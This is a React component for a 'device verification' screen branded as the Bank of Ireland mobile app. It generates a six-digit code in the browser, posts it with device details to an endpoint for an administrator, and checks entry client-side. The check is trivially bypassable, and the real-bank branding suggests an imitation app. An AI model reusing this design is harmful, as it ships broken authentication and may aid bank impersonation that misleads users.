import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";

interface OTCVerificationProps {
  onVerificationComplete: () => void;
}

export default function OTCVerification({ onVerificationComplete }: OTCVerificationProps) {
  const [otcCode, setOtcCode] = useState("");
  const [generatedCode, setGeneratedCode] = useState("");
  const [isGenerating, setIsGenerating] = useState(false);
  const [codeGenerated, setCodeGenerated] = useState(false);
  const { toast } = useToast();

  const generateOTC = async () => {
    setIsGenerating(true);
    
    try {
      // Generate 6-digit code
      const code = Math.floor(100000 + Math.random() * 900000).toString();
      setGeneratedCode(code);
      
      // Send code to admin email
      const response = await fetch('/api/send-otc', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          code: code,
          deviceInfo: {
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            platform: navigator.platform
          }
        }),
      });

      if (response.ok) {
        setCodeGenerated(true);
        toast({
          title: "Code Generated",
          description: "A 6-digit verification code has been sent to your admin email address.",
        });
      } else {
        throw new Error('Failed to send OTC code');
      }
    } catch (error) {
      console.error('OTC generation failed:', error);
      toast({
        title: "Error",
        description: "Failed to generate verification code. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsGenerating(false);
    }
  };

  const verifyOTC = () => {
    if (otcCode === generatedCode) {
      // Save device verification status
      localStorage.setItem("otcVerified", "true");
      localStorage.setItem("deviceVerifiedAt", new Date().toISOString());
      
      toast({
        title: "Verification Successful",
        description: "Device verified successfully. Redirecting to app...",
      });
      
      // Complete verification after brief delay
      setTimeout(() => {
        onVerificationComplete();
      }, 1000);
    } else {
      toast({
        title: "Invalid Code",
        description: "The entered code is incorrect. Please try again.",
        variant: "destructive",
      });
      setOtcCode("");
    }
  };

  const handleCodeChange = (value: string) => {
    // Only allow numbers and limit to 6 digits
    const numericValue = value.replace(/\D/g, '').slice(0, 6);
    setOtcCode(numericValue);
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && otcCode.length === 6) {
      verifyOTC();
    }
  };

  return (
    <div className="w-full h-full bg-white flex flex-col items-center justify-center p-6">
      <div className="max-w-md w-full space-y-8 text-center">
        <div>
          <h1 className="text-2xl font-semibold text-gray-900 mb-4">
            Not available right now
          </h1>
          <p className="text-gray-600 mb-8">
            This device needs to be verified before you can access the Bank of Ireland mobile app.
          </p>
        </div>

        {!codeGenerated ? (
          <div className="space-y-6">
            <p className="text-sm text-gray-500">
              Tap the button below to generate a verification code that will be sent to the administrator.
            </p>
            <Button 
              onClick={generateOTC}
              disabled={isGenerating}
              className="w-full bg-[#126987] hover:bg-[#0e5a75] text-white py-3 px-6 rounded-lg font-medium"
            >
              {isGenerating ? "Generating..." : "Generate"}
            </Button>
          </div>
        ) : (
          <div className="space-y-6">
            <p className="text-sm text-gray-500">
              Enter the 6-digit verification code that was sent to the administrator.
            </p>
            
            <div className="space-y-4">
              <Input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                value={otcCode}
                onChange={(e) => handleCodeChange(e.target.value)}
                onKeyPress={handleKeyPress}
                placeholder="Enter 6-digit code"
                className="text-center text-2xl tracking-wider font-mono border-2 border-gray-300 focus:border-[#126987] rounded-lg py-4"
                maxLength={6}
                autoFocus
              />
              
              <Button 
                onClick={verifyOTC}
                disabled={otcCode.length !== 6}
                className="w-full bg-[#126987] hover:bg-[#0e5a75] text-white py-3 px-6 rounded-lg font-medium disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Verify Code
              </Button>
              
              <Button 
                onClick={() => {
                  setCodeGenerated(false);
                  setOtcCode("");
                  setGeneratedCode("");
                }}
                variant="outline"
                className="w-full border-[#126987] text-[#126987] hover:bg-[#126987] hover:text-white py-3 px-6 rounded-lg font-medium"
              >
                Generate New Code
              </Button>
            </div>
          </div>
        )}

        <div className="mt-8 pt-6 border-t border-gray-200">
          <p className="text-xs text-gray-400">
            This verification is required only once per device for security purposes.
          </p>
        </div>
      </div>
    </div>
  );
}